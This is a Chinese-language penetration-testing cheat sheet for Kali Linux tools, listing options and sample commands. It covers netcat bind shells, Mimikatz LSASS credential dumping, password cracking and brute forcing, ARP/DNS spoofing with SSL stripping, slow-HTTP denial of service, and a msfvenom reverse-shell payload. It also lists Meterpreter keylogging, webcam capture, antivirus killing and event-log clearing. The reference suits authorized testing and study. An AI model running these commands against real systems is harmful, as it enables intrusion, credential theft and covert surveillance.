# Kali

## 更新

```
apt-get update                       //更新软件包列表库
apt-get install kali-linux-all       //安装所有kali工具包
apt-get upgrade                      //更新安装的软件包
apt-get dist-upgrade                 //根据依赖关系更新
apt-get clean                        //清除缓存索引
reboot                               //重启电脑
```

## 基本工具

### NC

```
-h     //显示帮助选项
-l     //绑定并监听传入连接
-p     //指定要使用的端口
-c     //通过/bin/sh 执行给定的命令
-e     //连接后执行程序
-q     //执行完毕X秒后退出
-n     //数字ip,不通过DNS解析
-v     //显示详细信息
-u     //使用UDP模式
-z     //使用扫描模式
------------------------------------
A：nc -lp 端口 | 解密方式 > 文件
B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
```

### Ncat

```
--allow         //只允许给定的主机连接到 ncat
--ssl           //使用 SSL 连接或监听
--keep-open     //在断开连接时保持侦听打开
-------------------------------------
A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
B：ncat -nv IP 地址 端口 --ssl
```

### SSH

```
service ssh start/restart/stop        #开启/重启/停止ssh服务
update-rc.d ssh enable/disabled       #开启/关闭ssh服务开机自启动
/etc/ssh/sshd_config                  #配置SSH
---------------------------------------------
PasswordAuthentication yes
permitrootlogin yes
---------------------------------------------
-b <ip>                               #使用本机指定地址作为源地址
-C                                    #进行数据压缩
-f                                    #后台执行ssh服务
-i <mi>                               #指定认证所需的私钥文件
-g                                    #允许远端主机连接本地转发的端口
-N                                    #不执行远程命令
-p <port>                             #指定远程主机的端口
-X                                    #开启X11转发功能
-x                                    #关闭X11转发功能
-L <lport:rhost:rport>                #将本地的某个端口转发到远端机器的指定端口
-R <rport:lhost:lport>                #将远程主机的某个端口转发到本地的指定端口
-D <lport>                            #指定本地机器"动态的"应用程序端口转发
```

### FTP

```
service vsftpd start/restart/stop     #开启/重启/停止ftp服务
username:anonymous password:null      #匿名登录
------------------------------------
open                #连接FTP服务器
get                 #下载指定文件
put                 #上传指定文件
delete              #删除FTP上文件
m***                #处理一批文件
hash                #显示下载进度
------------------------------------
echo open 192.168.253.139 21>ftp.txt
echo ftp>>ftp.txt
echo 123456>>ftp.txt
echo bin>>ftp.txt
echo get mimikatz.exe>>ftp.txt
echo bye>>ftp.txt
ftp -s:ftp.txt
```

### SMTP

```
/var/mail/              #邮件日志
telnet 192.168.0.1 25   #连接SMTP
--------------------------------------------
auth login              #用户身份认证(base64)
mail from:              #标识邮件的发件人
rcpt to:                #标识邮件的收件人
data                    #启动邮件内容传输
quit                    #结束会话
```

## 信息收集

### 第三方

- https://fofa.so

- http://www.yunsee.cn

- https://www.shodan.io

- https://www.ipaddress.com

- https://www.tianyancha.com

### Google

```
intitle:                         //搜索网页标题中是否有我们所要找的字符
intext:                          //寻找特定网页里的关键字
inurl:                           //搜索网址URL里面包含指定关键词的页面
site:                            //只搜索指定网域里的关键词
filetype:                        //搜索指定类型的文件
link:                            //按引用搜索将列出所有包含特定链接的页面
related:                         //按相似搜索将列出与指定网页相似的页面
cache:                           //网页快照,google将返回给你他储存下来的历史页面
index of                         //发现允许目录浏览的web网站
```

### Nmap

- 主机发现

```
-sn                             //仅进行ping扫描,不进行端口扫描
-Pn                             //跳过目标存活判断,直接进行进一步的探测
-PS/PA/PU/PY[portlist]          //使用TCP SYN/ACK,UDP,SCTP INIT方式进行发现
-n/-R                           //-n表示不进行DNS解析,-R表示总是进行DNS解析
--dns-servers <serv>            //指定DNS服务器
--system-dns                    //指定使用系统的DNS服务器
```

- 端口扫描

```
-p <port>                       //只扫描指定的端口
-F                              //快速扫描
-sS/sT/sA/sW/sM                 //使用TCP SYN/Connect()/ACK/Window/Maimon 扫描方式
-sU                             //使用UDP扫描方式确定目标主机的UDP端口状况
-sN/sF/sX                       //使用TCP Null/FIN/Xmas秘密扫描方式来协助探测对方的TCP端口状态
-sI <idle:port>                 //使用idle scan方式来扫描目标主机
```

- 版本侦测

```
-sV                              //服务版本探测
--version-intensity <level>      //指定版本侦测强度(0-9),默认为7
--version-trace                  //显示出详细的版本侦测过程信息
```

- 操作系统侦测

```
-O                               //启用操作系统检测
-A                               //同时启用操作系统检测和版本扫描
--osscan-guess/fuzzy             //推测操作系统检测结果
```

- 防火墙/IDS 规避

```
-f/--mtu <val>                   //指定使用分片、指定数据包的MTU
-D <ip1,ip2,...,ME>              //用一组IP地址掩盖真实地址,ME代表本机IP地址
-S <IP>                          //伪装成其他IP地址
-g/--source-port <port>          //使用指定源端口
--data-length <num>              //填充随机数据让数据包长度达到Num
--ttl <time>                     //设置time-to-live时间
```

## Web 程序

### dirb

> dirb URL \[file] \[options]

```
-a <agent_string>                 //指定自定义User-Agent
-c <cookie_string>                //设置HTTP请求的cookie
-H <header_string>                //向HTTP请求添加自定义头
-i                                //使用不区分大小写的搜索
-o <output_file>                  //将输出保存到磁盘
-p <proxy[:port]>                 //使用这个代理(默认端口为1080)
-P <username:password>            //代理身份验证
-r                                //不递归搜索
-R                                //交互式递归(询问每个目录)
-u <username:password>            //HTTP身份验证
-w                                //不要停留在警告信息上
-X/-x <extensions>                //在每个单词后附加此扩展名
-z <s>                            //添加一个毫秒的延迟,以避免造成过多的溢出
```

### skipfish

> dpkg -L skipfish \| grep wl
>
> skipfish \[options...] -W wordlist -o path url

```
-A user:pass                      //使用指定的HTTP身份验证凭据
-C name=val                       //将自定义Cookie附加到所有请求
-H name=val                       //将自定义HTTP标头附加到所有请求
-b <i|f|p>                        //使用与MSIE/Firefox/iPhone一致的标头
-N                                //不接受任何新的cookie
--auth-form url                   //表单认证URL
--auth-user user                  //表单认证用户名
--auth-pass pass                  //表单认证密码
--auth-verify-url                 //认证成功跳转的URL
-I string                         //只追踪与「string」匹配的网址
-X string                         //排除与「string」匹配的网址
-K string                         //不对指定参数进行Fuzz测试
-o path                           //将输出写入指定目录（必填）
-W wordlist                       //使用指定的读写词表
-S wordlist                       //加载补充只读单词表
-l num                            //每秒最大请求数
```

### sqlmap

```
-d                                #DBMS://user:password@ip:port/database_name
-u url                            #目标网址(例如"http://www.site.com/vuln.php?id=1")
-l logfile                        #解析来自Burp或WebScarab代理日志文件的目标
-m file                           #扫描文本文件中给定的多个目标
-r reqfile                        #从文件加载HTTP请求
-p parameter                      #可测试的参数
--method=METHOD                   #强制使用给定的HTTP方法(例如PUT)
--data=DATA                       #通过POST发送数据参数(例如"id = 1")
--cookie=COOKIE                   #HTTP Cookie标头值
--random-agent                    #使用随机选择的HTTP User-Agent标头值
--proxy=PROXY                     #使用代理连接目标
--tor                             #使用Tor匿名网络
--force-ssl                       #强制使用SSL/HTTPS
--level=LEVEL                     #要执行的测试级别(1-5,默认为1)
--risk=RISK                       #执行测试的风险(0-3，默认为1)
--technique=TECH                  #要使用的SQL注入技术(默认为“BEUSTQ”)
```

### wpscan

```
--url url                         #要扫描博客的URL
-o/--output file                  #输出到文件
--random-user-agent/--rua         #每次扫描都使用随机用户代理
--http-auth login:password        #用户认证登录
-e/--enumerate [opts]
    vp                            #枚举有漏洞的插件
    ap                            #枚举所有插件
    p                             #枚举热门插件
    vt                            #枚举有漏洞的主题
    at                            #枚举所有主题
    t                             #枚举热门主题
    cb                            #枚举配置备份
    tt                            #枚举Timthumb文件
    u                             #枚举用户名
-P/--passwords file               #密码攻击期间使用的密码列表
-U/--usernames file               #密码攻击中使用的用户名列表
--stealthy                        #随机用户代理,检测模式被动,插件版本检测被动
```

## 密码破解

### Crunch

> crunch 7 7 -t p@ss,%^ -l a@aaaaa

```
-b num                        //指定文件输出的大小(kb,mb,gb,kib,mib,gib)
-e str                        //指定停止字符串
-f                            //指定库中字符集(/usr/share/crunch/charset.lst)
-l                            //与-t联用,表明字符为实义字符
-o file                       //将密码保存到指定文件
-p a b ..                     //组合元素进行生成
-s str                        //指定起始字符串
-t                            //指定密码输出的格式(%数字 ^符号 @小写 ,大写)
-z                            //压缩生成的字典文件(gzip,bzip2,lzma,7z)
```

### Hydra

> hydra -l 用户名 -P 密码字典 -t 线程数 -vV -e ns 主机地址 指定服务
>
> http-form-post "/login.php:username=^USER^&password=^PASS^:S=login.php"

```
-R                             //继续从上一次进度开始
-l                             //指定用户名
-L                             //指定用户名字典
-p                             //指定密码
-P                             //指定密码字典
-x min:max:charset             //密码暴力生成("-x -h"获取更多帮助)
-e [nsr]                       //空密码,密码=用户名,颠倒
-u                             //循环用户,而不是密码(-x同样有效)
-o [file]                      //输出成文件
-t [num]                       //同时运行的线程数,默认16
-w [time]                      //设置最大超时的时间,默认30s
-vV                            //显示详细过程
-S                             //采用SSL链接
-s [port]                      //指定非默认端口
-f                             //当破解成功时就中止
```

### Medusa

> medusa -h 主机 IP -u 用户名 -P 字典 -e ns -f -M service 服务

```
-h                              //目标主机名或IP地址
-H [file]                       //包含目标主机名或IP地址的文件
-u                              //指定用户名
-U [file]                       //指定用户名字典
-p                              //指定密码
-P [file]                       //指定密码字典
-e [n/s/ns]                     //空密码和密码=用户名
-M                              //要执行的模块
-L                              //每个线程使用一个用户名并行登录
-t [num]                        //要同时测试的登录总数
-T [num]                        //要同时测试的主机总数
-f                              //发现第一个有效的用户名/密码后停止
-F                              //在任何主机上找到第一个有效的用户名/密码后停止
-n [num]                        //使用非默认的TCP端口号
-s                              //启用SSL
-O [file]                       //输出成文件
-v <0-6>                        //显示详细信息
```

### Mimikatz

```
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full
```

### John

> unshadow /etc/passwd /etc/shadow > passwd
>
> python /usr/share/john/ssh2john.py id_rsa > passwd
>
> john --wordlist=/root/password/rockyou.txt passwd

```
--single[=section[,..]]          //single crack模式,使用默认或命名规则
--wordlist[file] --stdin         //单词列表模式,从文件或标准输出中读取单词
                 --pipe          //和--stdin一样,批量读取,并允许使用规则
--loopback[file]                 //类似于--wordlist，但从.pot文件中提取单词
--rules[section[,..]]            //启用单词处理规则,使用默认规则或命名规则
--incremental[mode]              //"增量"模式[使用部分模式]
--mask[mask]                     //使用掩码模式(或john.conf中的默认设置)
--external=mode                  //外部模式或字过滤器
--restore[name]                  //恢复中断的会话[名为name]
--session=name                   //进行新的会话"name"
--show[file]                     //显示破解的密码
--format=name                    //强制输入name类型的哈希
```

### Hashcat

> hashcat -a 0/1/3 -m typeID 字段/文件 字典/暴力 ...

```
-a <0/1/2>                        //指定要使用的破解模式[0-字典攻击,1-组合攻击,3-掩码攻击]
-m <id>                           //指定要破解的hash类型ID,如果不指定类型默认为MD5
-i  --increment                   //启用增量破解模式
    --increment-min               //密码最小长度
    --increment-max               //密码最大长度
-o  --outfile                     //将破解成功的hash输出在指定目录的文件中
    --outfile-format              //指定破解结果的输出格式ID,默认3
--force                           //忽略警告信息
--show                            //显示已经破解的hash及该hash所对应的明文
```

## 嗅探/欺骗

### ARP

```
echo 1 > /proc/sys/net/ipv4/ip_forward            //路由转发
arpspoof -i eth0 -t 192.168.0.144 192.168.0.1     //arp欺骗
driftnet -i eth0                                  //图片嗅探
```

### Bettercap

> 开启本地(远程)的 WebUI -------→ bettercap -caplet http(s)-ui

```
net.show          //展示网络情况
net.probe         //主动探测
arp.spoof         //ARP欺骗
http.proxy        //http代理
net.sniff         //开启嗅探
dns.spoof         //DNS欺骗
---------------------------------------------------------------
set arp.spoof.targets 192.168.1.1         //设置欺骗的IP目标
set http.proxy.sslstrip true              //将HTTPS降级到HTTP
set http.proxy.script xss.js              //代理执行的脚本
set net.sniff.verbose false               //精简化显示数据
set dns.spoof.domains google.com          //设置要欺骗的域名
set dns.spoof.address desired_IP          //设置要重定向的地址
```

## 压力测试

> iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.0.1 -j DROP

### slowhttptest

```
-H              //Slowloris模式:完整http请求是以\r\n\r\n结尾,攻击时仅发送\r\n(耗尽应用并发连接池)
-B              //slow post模式:通过声明content-length后,body缓慢发送(耗尽应用并发连接池)
-s size         //指定Slow POST测试的Content-Length大小
-i time         //在slowrois和Slow POST模式中,指定发送数据间的间隔
-R              //Apache Range Header模式:客户端发送大文件,体积超出body限制进行分段(耗尽CPU,内存)
-a start        //设置Range Header攻击的范围说明符的起始值
-b big          //设置Range Header攻击的范围说明符的极限值
-X              //slow read模式:向服务器发送正常请求,但慢速读取响应(TCP window窗口大小,耗尽连接池)
-w num          //slow read模式中指定tcp窗口范围下限
-y num          //slow read模式中指定tcp窗口范围上限
-z num          //指定每个read操作从接收缓冲区读取的字节数
-n time         //在Slow Read模式下,指定每次操作的时间间隔
-u URL          //目标的URL地址(http://localhost/)
-c num          //建立目标连接数
-r num          //每秒连接数
-p time         //指定等待时间来确认DoS攻击已经成功
-t method       //在请求时使用什么操作,默认GET
-d host:port    //通过host:port上的HTTP代理定向的所有流量
```

## Metasploit

### 常用命令

```
search -S script web_delivery
search exploit/multi/handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options/targets
show advanced
set autorunscript migrate -n explorer.exe
sessions -u ID
route add 192.168.0.0/24 ID
```

### Msfvenom

```
-p payload                     //指定payload,自定义使用'-'
-l module                      //列出指定模块的可用资源
-f format                      //指定输出格式,--list formats查看格式列表
-e encoder                     //指定编码器
-i num                         //指定编码次数
-b chars                       //规避的字符集,例"\x00\xff"
-x file                        //指定自定义模板
-k                             //保护模板动作,注入payload将作为新进程运行
-o file                        //输出文件
--encrypt                      //指定加密方式
--encrypt-key                  //用于加密的密钥
--shellest                     //最小化生成payload
-----------------------------------------------------------------
msfvenom -l payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
msfvenom --list formats
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=5555 -f exe -o payload.exe
```

### Meterpreter

```
background                      //当前会话退至后台
load                            //使用扩展库(如kiwi/incognito/sniffer)
run                             //使用Post模块
migrate [pid]                   //迁移进程
shell                           //进入系统命令行
search                          //搜索文件
download                        //下载文件或目录
upload                          //上传文件或目录
-----------------------------------------------------
keyscan_dump                    //显示键盘记录信息
keyscan_start                   //开始捕获按键
keyscan_stop                    //停止捕获击键
screenshare                     //实时远程的桌面
screenshot                      //抓取桌面的屏幕截图
record_mic                      //录制默认麦克风的音频X秒
webcam_list                     //列出网络摄像头
webcam_snap                     //从指定的网络摄像头拍摄快照
webcam_stream                   //从指定的网络摄像头播放视频流
-----------------------------------------------------
sysinfo                         //获取操作系统的信息
portfwd                         //端口转发
getprivs                        //尝试启用当前进程可用的所有特权
getsystem                       //尝试提权
hashdump                        //导出密码的哈希
timestomp                       //改变文件属性
clearev                         //清除事件日志
-----------------------------------------------------
run autoroute                   //自动路由
run killav                      //关闭杀毒
run getgui                      //远程桌面
run get_application_list        //软件信息
run dumplinks                   //最近操作
```

## 取证工具

### steghide

```
embed/--embed                    //嵌入数据
extract/--extract                //提取数据
info/--info                      //显示相关信息
encinfo/--encinfo                //显示受支持的加密算法列表
-ef                              //选择要嵌入的文件
-cf                              //选择要覆盖文件
-sf                              //选择要提取的文件
-p                               //指定密码
-e                               //指定加密方式
```

## 推荐扩展

- [中国蚁剑](https://github.com/AntSwordProject/AntSword-Loader)
- [密码检索工具](https://github.com/AlessandroZ/LaZagne)
- [Linux 提权检查](https://github.com/rebootuser/LinEnum)
